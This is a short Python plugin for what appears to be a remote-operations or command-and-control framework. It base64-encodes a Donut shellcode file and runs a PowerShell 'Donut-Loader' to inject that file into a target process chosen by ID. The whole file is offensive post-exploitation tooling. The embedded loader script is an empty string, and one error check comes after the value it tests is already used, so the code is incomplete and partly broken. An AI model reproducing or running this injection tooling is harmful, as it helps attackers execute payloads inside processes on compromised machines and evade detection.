import json
import re
import base64
from remoteops.commands.plugin_api import PluginError

def file_to_b64(filepath):
    try:
        with open(filepath,"rb") as file:
            file_content = file.read()
    except FileNotFoundError:
        raise PluginError("Error: The file you are trying to open does not exist.")
    except PermissionError:
        raise PluginError("Error: You do not have permission to open this file.")
    except OSError as e:
        raise PluginError(f"A system error occurred: {e}")
    return base64.b64encode(file_content)
    
def run(ctx, args):
    filepath = args.get("file")
    b64_file = file_to_b64(filepath)
    b64_string = b64_file.decode("utf-8")
    if b64_file is None:
        raise PluginError("Error loading in donut binary file.")
    processid = int(args.get("processid"))
    if processid <= 0:
        raise PluginError("Process Id can't be <= 0")
    donuts = ''
    
    script = base64.b64decode(donuts).decode("utf-8-sig")
    
    
    ctx.powershell(script)
    result = ctx.powershell(f"Donut-Loader -process_id {processid} -donutfile {b64_string}")
    return [{"Process ID": processid, "File": filepath, "Result":result}]
